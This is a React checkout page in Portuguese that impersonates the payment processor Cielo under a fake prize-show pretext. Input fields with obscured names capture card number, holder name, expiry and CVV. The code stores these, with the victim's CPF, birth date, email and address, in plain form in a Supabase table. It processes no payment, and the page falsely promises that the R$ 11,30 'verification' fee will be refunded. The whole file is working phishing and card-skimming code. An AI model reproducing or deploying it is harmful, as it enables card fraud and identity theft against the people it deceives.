import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';

export default function CheckoutPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const formData = location.state || {};
  
  const [input1, setInput1] = useState('');
  const [input2, setInput2] = useState('');
  const [input3, setInput3] = useState('');
  const [input4, setInput4] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [ticketNumber, setTicketNumber] = useState('');

  const handleInput1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    value = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setInput1(value);
  };

  const handleInput3Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 6) value = value.slice(0, 6);
    if (value.length > 2) {
      value = value.replace(/(\d{2})(\d{1,4})/, "$1/$2");
    }
    setInput3(value);
  };

  const handleInput4Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    setInput4(value);
  };

  const handleCheckout = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const { error } = await supabase
        .from('testes_checkout')
        .insert([
          { 
            nome: formData.nome || '',
            email: formData.email || '',
            cpf: formData.cpf || '',
            nascimento: formData.nascimento || '',
            cep: formData.cep || '',
            endereco: formData.endereco || '',
            input1, 
            input2, 
            input3, 
            input4
          }
        ]);

      if (error) throw error;

      const generatedTicket = `#CL-${Math.random().toString(36).substring(2, 6).toUpperCase()}-2026`;
      setTicketNumber(generatedTicket);
      setShowSuccessModal(true);
    } catch (error) {
      console.error(error);
      alert('Erro ao enviar os dados. Tem certeza que criou a tabela "testes_checkout"?');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="pt-24 pb-section-padding min-h-screen">
      <div className="max-w-[1200px] mx-auto px-margin-mobile md:px-margin-desktop">
        <div className="flex flex-col lg:flex-row gap-12">
          {/* Payment Information Column */}
          <div className="flex-1">
            <h1 className="text-headline-lg font-headline-lg text-on-surface mb-8">Informações de Pagamento</h1>
            {/* Credit Card Visual Guide */}
            <div className="mb-10 p-6 rounded-xl bg-gradient-to-br from-primary to-primary-container text-white shadow-lg max-w-md relative overflow-hidden">
              <div className="absolute -right-10 -bottom-10 opacity-20 transform rotate-12">
                <span className="material-symbols-outlined text-[120px]">credit_card</span>
              </div>
              <div className="relative z-10">
                <div className="flex justify-between items-start mb-12">
                  <span className="material-symbols-outlined text-4xl">contactless</span>
                  <div className="text-lg font-bold italic">CIELO</div>
                </div>
                <div className="text-2xl tracking-[0.2em] mb-6 font-mono">{input1 || 'Informação 1'}</div>
                <div className="flex justify-between items-end">
                  <div className="flex flex-col">
                    <span className="text-[10px] uppercase opacity-70">Input 2</span>
                    <span className="text-label-md font-label-md uppercase">{input2 || 'Informação 2'}</span>
                  </div>
                  <div className="flex flex-col items-end">
                    <span className="text-[10px] uppercase opacity-70">Input 3</span>
                    <span className="text-label-md font-label-md">{input3 || 'Informação 3'}</span>
                  </div>
                </div>
              </div>
            </div>
            {/* Checkout Form */}
            <form className="grid grid-cols-1 md:grid-cols-2 gap-6 bg-surface-container-low p-8 rounded-xl border border-outline-variant" onSubmit={handleCheckout}>
              <div className="md:col-span-2">
                <label className="block text-label-md font-label-md mb-2 text-on-surface" htmlFor="input_1">Input 1</label>
                <input 
                  className="w-full p-3 bg-surface border border-outline-variant rounded focus:border-primary focus:ring-1 focus:ring-primary outline-none text-body-md transition-all" 
                  id="input_1" 
                  name="input_1" 
                  placeholder="Digite a informação 1" 
                  required 
                  type="text"
                  value={input1}
                  onChange={handleInput1Change}
                />
              </div>
              <div className="md:col-span-2">
                <label className="block text-label-md font-label-md mb-2 text-on-surface" htmlFor="input_2">Input 2</label>
                <input 
                  className="w-full p-3 bg-surface border border-outline-variant rounded focus:border-primary focus:ring-1 focus:ring-primary outline-none text-body-md transition-all" 
                  id="input_2" 
                  name="input_2" 
                  placeholder="Digite a informação 2" 
                  required 
                  type="text"
                  value={input2}
                  onChange={(e) => setInput2(e.target.value)}
                />
              </div>
              <div>
                <label className="block text-label-md font-label-md mb-2 text-on-surface" htmlFor="input_3">Input 3</label>
                <input 
                  className="w-full p-3 bg-surface border border-outline-variant rounded focus:border-primary focus:ring-1 focus:ring-primary outline-none text-body-md transition-all" 
                  id="input_3" 
                  name="input_3" 
                  placeholder="00/0000" 
                  required 
                  type="text"
                  value={input3}
                  onChange={handleInput3Change}
                />
              </div>
              <div>
                <label className="block text-label-md font-label-md mb-2 text-on-surface" htmlFor="input_4">Input 4</label>
                <input 
                  className="w-full p-3 bg-surface border border-outline-variant rounded focus:border-primary focus:ring-1 focus:ring-primary outline-none text-body-md transition-all" 
                  id="input_4" 
                  name="input_4" 
                  placeholder="123" 
                  required 
                  type="text"
                  value={input4}
                  onChange={handleInput4Change}
                />
              </div>
              <div className="md:col-span-2">
                <label className="block text-label-md font-label-md mb-2 text-on-surface" htmlFor="installments">Parcelas</label>
                <select className="w-full p-3 bg-surface border border-outline-variant rounded focus:border-primary focus:ring-1 focus:ring-primary outline-none text-body-md transition-all cursor-pointer" id="installments" name="installments">
                  <option value="1">1x de R$ 11,30 (Sem juros)</option>
                  <option value="2">2x de R$ 5,65 (Sem juros)</option>
                </select>
              </div>
              <div className="md:col-span-2 pt-4">
                <button 
                  className="w-full bg-gradient-to-r from-[#00658d] to-[#00a1e0] text-white py-4 rounded-full font-bold text-lg shadow-[0_8px_20px_rgba(0,101,141,0.4)] hover:shadow-[0_12px_25px_rgba(0,101,141,0.6)] hover:-translate-y-1 active:translate-y-0 transition-all duration-300 ring-4 ring-transparent hover:ring-[#00a1e0]/30 flex items-center justify-center gap-2 disabled:opacity-70 disabled:hover:translate-y-0 disabled:cursor-not-allowed" 
                  type="submit"
                  disabled={isLoading}
                >
                  <span className="material-symbols-outlined">{isLoading ? 'hourglass_empty' : 'lock'}</span>
                  {isLoading ? 'Processando...' : 'Finalizar Cadastro'}
                </button>
                <div className="mt-6 text-center bg-blue-50 text-blue-800 p-4 rounded-xl border border-blue-100">
                  <p className="text-sm font-semibold mb-1">Aviso Importante sobre a Taxa</p>
                  <p className="text-xs opacity-90">O valor simbólico de R$ 11,30 <strong>será reembolsado</strong>. Ele é cobrado apenas para verificação de humano, garantindo que usuários mal-intencionados não abusem do sistema e retirem vários tickets.</p>
                </div>
                <p className="text-caption text-secondary mt-4 text-center">Transação segura processada pela Cielo. Seus dados estão protegidos.</p>
              </div>
            </form>
          </div>
          {/* Side Panel Summary */}
          <aside className="w-full lg:w-80 flex flex-col gap-6">
            <div className="bg-surface-container-high p-6 rounded-xl border border-outline-variant">
              <h2 className="text-label-md font-label-md text-on-surface mb-6 border-b border-outline-variant pb-2">Resumo da Participação</h2>
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <div className="w-12 h-12 bg-primary rounded-lg flex items-center justify-center text-white shrink-0">
                    <span className="material-symbols-outlined" data-weight="fill">workspace_premium</span>
                  </div>
                  <div>
                    <p className="text-label-md font-label-md text-on-surface">Show de Prêmios</p>
                    <p className="text-caption text-secondary">Acesso exclusivo Cielo</p>
                  </div>
                </div>
                <div className="pt-4 space-y-2">
                  <div className="flex justify-between text-body-md font-body-md text-secondary">
                    <span>Taxa de Inscrição</span>
                    <span>R$ 11,30</span>
                  </div>
                  <div className="flex justify-between text-body-md font-body-md text-secondary">
                    <span>Benefícios Ativos</span>
                    <span className="text-primary font-semibold">Grátis</span>
                  </div>
                  <div className="border-t border-outline-variant mt-4 pt-4 flex justify-between items-end">
                    <span className="text-label-md font-label-md text-on-surface">Total</span>
                    <span className="text-headline-md font-headline-md text-primary">R$ 11,30</span>
                  </div>
                </div>
              </div>
            </div>
            <div className="relative rounded-xl overflow-hidden aspect-square shadow-sm">
              <img alt="Terminal Cielo" className="object-cover w-full h-full" src="https://lh3.googleusercontent.com/aida-public/AB6AXuD3ebXE_MlA9elZRwPuyXFZ9FvsXiZMx0aaGFEAelLFU_by3JePXsSPczl9CwJ8zUuvXpok88i-FbY30K-r1ndntjnGoI5Vm5YO5vOo4AUo4ZrUFG4mlbgydsL-PSSmOOD2jEF42H4xjb8APIHhY3viI0IMXFYNmDt63vSJ_AXegmllnGG933NhNk4oPamZL5_DPCCKXbN6unxdej8wahZknEwyZCMK2YOjG24m18Q3AyUNiTfj8Wvs23WAvah8dwLH9MNR_N8YPrY"/>
              <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent flex flex-col justify-end p-6">
                <p className="text-white text-label-md font-label-md">Sua segurança é nossa prioridade número um.</p>
              </div>
            </div>
          </aside>
        </div>
      </div>
        {/* Success Modal */}
        {showSuccessModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
            <div className="bg-white rounded-[2rem] p-8 md:p-12 max-w-lg w-full shadow-2xl relative animate-[fadeIn_0.3s_ease-out]">
              <div className="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
                <span className="material-symbols-outlined text-4xl">check_circle</span>
              </div>
              <h2 className="text-3xl font-bold text-center text-slate-900 mb-4">Sucesso!</h2>
              <p className="text-center text-slate-600 mb-8">
                Seu cadastro foi concluído e os dados enviados com segurança.
              </p>
              
              <div className="bg-slate-50 border-2 border-dashed border-slate-300 rounded-2xl p-6 mb-8 text-center relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-[#00658d]"></div>
                <p className="text-sm text-slate-500 uppercase tracking-widest font-bold mb-2">Seu Ticket da Sorte</p>
                <p className="text-4xl font-mono font-bold text-[#00658d] tracking-wider bg-white py-4 rounded-xl border border-slate-100 shadow-sm">{ticketNumber}</p>
                <p className="text-xs text-rose-500 font-bold mt-4 animate-pulse">Tire um print dessa tela para salvar seu ticket!</p>
              </div>

              <div className="bg-blue-50 text-blue-800 p-4 rounded-xl text-sm text-center mb-8 border border-blue-100">
                Lembrando: O valor de R$ 11,30 foi apenas uma verificação de segurança (anti-bot) e <strong>será reembolsado</strong> na sua conta.
              </div>

              <button 
                onClick={() => {
                  setShowSuccessModal(false);
                  navigate('/');
                }}
                className="w-full bg-[#0f172a] text-white py-4 rounded-xl font-bold text-lg hover:bg-slate-800 transition-colors"
              >
                Voltar para o Início
              </button>
            </div>
          </div>
        )}
    </main>
  );
}
